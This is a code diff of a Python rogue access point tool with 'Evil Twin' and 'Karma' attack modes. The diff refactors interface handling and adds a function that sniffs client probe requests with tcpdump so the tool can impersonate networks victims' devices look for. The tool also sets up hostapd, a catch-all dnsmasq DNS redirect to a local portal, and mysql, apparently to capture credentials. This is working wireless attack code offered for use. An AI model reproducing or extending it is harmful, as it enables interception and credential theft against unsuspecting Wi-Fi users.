@@ -24,13 +24,10 @@ class networkInterfaces:
 
     def __init__(self):
         self.interfaces = []
-        self.num = 0
 
         for dirpath, interfaces, filenames in os.walk(self.netIntDir):
             for interface in interfaces:
                 if re.match(r'wlan\d', interface):
-                    self.num = self.num + 1
-
                     # Directory /sys/class/net/<interface>/type contains 
                     # the mode in which the interface is operating:
                     #   1   -> managed
@@ -38,20 +35,22 @@ class networkInterfaces:
                     #
                     f = open(self.netIntDir + '/' + interface + '/type', 'r')
                     if f.read() == '803\n':
-                        self.interfaces.append({'i' : self.num, 'name' : interface, 'mode' : 'monitor'})
+                        self.interfaces.append({'name' : interface, 'mode' : 'monitor'})
                     else:
-                        self.interfaces.append({'i' : self.num, 'name' : interface, 'mode' : 'managed'})
+                        self.interfaces.append({'name' : interface, 'mode' : 'managed'})
                     f.close()
 
     def __repr__(self):
         ret = '\nNETWORK INTERFACES\n\n'
 
+        i = 1
         for interface in self.interfaces:
             if interface['mode'] == 'monitor':
-                ret += '[{}] -> {} ({})\n'.format(interface['i'], interface['name'], interface['mode'])
+                ret += '[{}] -> {} ({})\n'.format(i, interface['name'], interface['mode'])
             else:
-                ret += '[{}] -> {}\n'.format(interface['i'], interface['name'])
-
+                ret += '[{}] -> {}\n'.format(i, interface['name'])
+            i = i + 1
+            
         return ret
 
     def putInMonitor(self, nInterface):
@@ -59,7 +58,7 @@ class networkInterfaces:
             print('[x] Input value is not an integer!\n')
             return -1
 
-        if nInterface < 0 or nInterface >= self.num:
+        if nInterface < 0 or nInterface >= len(self.interfaces):
             print('[x] Input value out of bounds!\n')
             return -1
 
@@ -90,7 +89,7 @@ class networkInterfaces:
             print('[x] Input value is not an integer!\n')
             return -1
 
-        if nInterface < 0 or nInterface >= self.num:
+        if nInterface < 0 or nInterface >= len(self.interfaces):
             print('[x] Input value out of bounds!\n')
             return -1
 
@@ -129,12 +128,12 @@ class networkInterfaces:
             hostapdConfig += 'auth_algs=3\n'
             hostapdConfig += 'ignore_broadcast_ssid=0\n'
 
-        f = open(tempFolder + '/' + hostapdConfigFile, 'w')
+        f = open(os.path.join(tempFolder, hostapdConfigFile), 'w')
         f.write(hostapdConfig)
         f.close()
 
         # Hostapd initialization
-        os.system('hostapd ' + tempFolder + '/' + hostapdConfigFile + ' > ' + tempFolder + '/' + self.hostapdLogFile + ' &')
+        os.system('hostapd ' + os.path.join(tempFolder, hostapdConfigFile) + ' > ' + os.path.join(tempFolder, self.hostapdLogFile) + ' &')
         print('[+] hostapd succesfuly configured')
         
         return 0
@@ -144,7 +143,7 @@ class networkInterfaces:
             print('[x] Input value is not an integer!\n')
             return -1
 
-        if nInterface < 0 or nInterface >= self.num:
+        if nInterface < 0 or nInterface >= len(self.interfaces):
             print('[x] Input value out of bounds!\n')
             return -1
 
@@ -195,13 +194,13 @@ class networkInterfaces:
             dnsmasqConfig += 'listen-address=127.0.0.1\n'
             dnsmasqConfig += 'address=/#/10.0.0.1\n'
 
-        f = open(tempFolder + '/' + dnsmasqConfigFile, 'w')
+        f = open(os.path.join(tempFolder, dnsmasqConfigFile), 'w')
         f.write(dnsmasqConfig)
         f.close
 
         # Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
         # (.htaccess) can reffer directly to the domain name in the URL
-        f = open(tempFolder + '/' + dnsmasqHostsFile, 'w')
+        f = open(os.path.join(tempFolder, dnsmasqHostsFile), 'w')
         f.write('10.0.0.1 wifiportal2.aire.es')
         f.close()
 
@@ -209,12 +208,81 @@ class networkInterfaces:
         os.system('ifconfig ' + interface + ' 10.0.0.1')
 
         # Initialize dnsmasq
-        os.system('dnsmasq -C ' + tempFolder + '/' + dnsmasqConfigFile + ' -H ' + tempFolder + '/' + dnsmasqHostsFile + ' --log-facility=' + tempFolder + '/' + self.dnsmasqLogFile)
+        os.system('dnsmasq -C ' + os.path.join(tempFolder, dnsmasqConfigFile) + ' -H ' + os.path.join(tempFolder, dnsmasqHostsFile) + ' --log-facility=' + os.path.join(tempFolder, self.dnsmasqLogFile))
 
         print('[+] dnsmasq succesfuly configured')
 
         return 0
 
+    def sniffProbeReq(self, nInterface, sigint_handler):
+        tcpdumpLogFile = 'tcpdump.log'
+        tcpdumpFD = 0
+        probeRequests = []
+
+        if type(nInterface) is not int:
+            print('[x] Input value is not an integer!\n')
+            return -1
+
+        if nInterface < 0 or nInterface >= len(self.interfaces):
+            print('[x] Input value out of bounds!\n')
+            return -1
+
+        # We need to create the file before reading it, as tcpdump
+        # may delay a few miliseconds until it creates it it self
+        f = open(os.path.join(tempFolder, tcpdumpLogFile), 'w+')
+        f.close()
+
+        os.system('tcpdump -l -e -i' + self.interfaces[nInterface]['name'] + ' type mgt subtype probe-req>' + os.path.join(tempFolder, tcpdumpLogFile) + ' 2>&1 &')
+
+        tcpdumpFD = open(os.path.join(tempFolder, tcpdumpLogFile), 'r')
+
+        # stop is defined as global for the sigint handler to be able to get it
+        global stop
+        stop = False
+
+        def sigint_handler_probe(sig, frame):
+            global stop
+            stop = True
+            signal.signal(signal.SIGINT, sigint_handler)
+        
+        signal.signal(signal.SIGINT, sigint_handler_probe)
+
+        print('PROBE REQUESTS (Ctrl C to stop)')
+        while not stop:
+            line = tcpdumpFD.readline()
+            if line:
+                client = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
+                ap = re.findall(r'[(](.+?)[)]', line)
+                if client and len(ap) == 2:
+                    newProbeRequest = {'client' : client.group(), 'ap' : ap[1]}
+                    try:
+                        probeRequests.index(newProbeRequest)
+                        inList = True
+                    except ValueError:
+                        inList = False
+                    
+                    if not inList:
+                        probeRequests.append(newProbeRequest)
+                        #print(probeRequests)
+                        print('[' + str(len(probeRequests)) + '] ' + client.group() + ' -> ' + ap[1])
+
+            time.sleep(1)
+        
+        tcpdumpFD.close()
+        os.system('pkill tcpdump')
+        print()
+        
+        probeRequest = -1
+        while probeRequest < 0 or probeRequest >= len(probeRequests):
+            probeRequest = int(input('Select probe request to mirror > ')) - 1
+
+            if probeRequest < 0 or probeRequest >= len(probeRequests):
+                print('[x] Input out of bounds!')
+            else:
+                return probeRequests[probeRequest]
+
+# We define the file descriptors for hostapd log file and dnsmasq log file
+# as global in order for the sigint handler to be able to get them
 hostapdFD = 0
 dnsmasqFD = 0
 def sigint_handler(sig, frame):
@@ -224,6 +292,9 @@ def sigint_handler(sig, frame):
 
     os.system('rm -r ' + tempFolder + ' 2>/dev/null')
 
+    global hostapdFD
+    global dnsmasqFD
+
     if hostapdFD != 0:
         hostapdFD.close()
 
@@ -231,7 +302,6 @@ def sigint_handler(sig, frame):
         dnsmasqFD.close()
 
     quit()
-
 
 signal.signal(signal.SIGINT, sigint_handler)
 
@@ -245,23 +315,23 @@ if os.getuid() != 0:
 networkInterfaces = networkInterfaces()
 
 # Select network interface
-if networkInterfaces.num == 0:
+if len(networkInterfaces.interfaces) == 0:
     print('[x] No network interface detected!\n')
     quit()
 
-elif networkInterfaces.num == 1:
+elif len(networkInterfaces.interfaces) == 1:
     if networkInterfaces.interfaces[0]['mode'] != 'monitor':
         if networkInterfaces.putInMonitor(0) != 0:
             quit()
     interface = 0
 
-elif networkInterfaces.num > 1:
+elif len(networkInterfaces.interfaces) > 1:
     ok = -1
     while ok != 0: 
         print(networkInterfaces)
-        interface = int(input('Select network interface > '))
+        interface = int(input('Select network interface > ')) - 1
         print()
-        if interface < 0 or interface >= networkInterfaces.num: 
+        if interface < 0 or interface >= len(networkInterfaces.interfaces): 
             print('[x] Input value out of bounds!')
         else:
             if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
@@ -290,7 +360,7 @@ while op < 1 or op > 3:
     print('[1] -> Create new acces point')
     print('[2] -> [Evil Twin] Intercept existing access point')
     print('[3] -> [Karma] Create acces point recogniced by victim')
-    op = int(input(' > '))
+    op = int(input('Select operation mode > '))
     print()
 
     if op == 1:
@@ -317,6 +387,24 @@ while op < 1 or op > 3:
 
     elif op == 3:
         deauth = False
+        probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
+        ssid = probeRequest['ap']
+        channel = input('Channel > ')
+
+        encr = -1
+        print('\nSecurity:')
+        while encr < 1 or encr > 2:
+            print('[1] -> Open')
+            print('[2] -> WPA2')
+            encr = int(input(' > '))
+            if encr < 1 or encr > 2:
+                print('[x] Input value out of bounds!\n')
+            elif encr == 1:
+                encryption = "OPEN"
+            elif encr == 2:
+                encryption = "WPA2"
+        print()
+
 
     else:
         print('[x] Input value out of bounds!\n')
@@ -352,8 +440,8 @@ os.system('service mysql start')
 print('[+] mysql configured succesfuly')
 
 # Print hostapd + dnsmasq
-hostapdFD = open(tempFolder + '/' + networkInterfaces.hostapdLogFile, 'r')
-dnsmasqFD = open(tempFolder + '/' + networkInterfaces.dnsmasqLogFile, 'r')
+hostapdFD = open(os.path.join(tempFolder, networkInterfaces.hostapdLogFile), 'r')
+dnsmasqFD = open(os.path.join(tempFolder, networkInterfaces.dnsmasqLogFile), 'r')
 prev = ''
 while True:
     hostapdLog = hostapdFD.read()
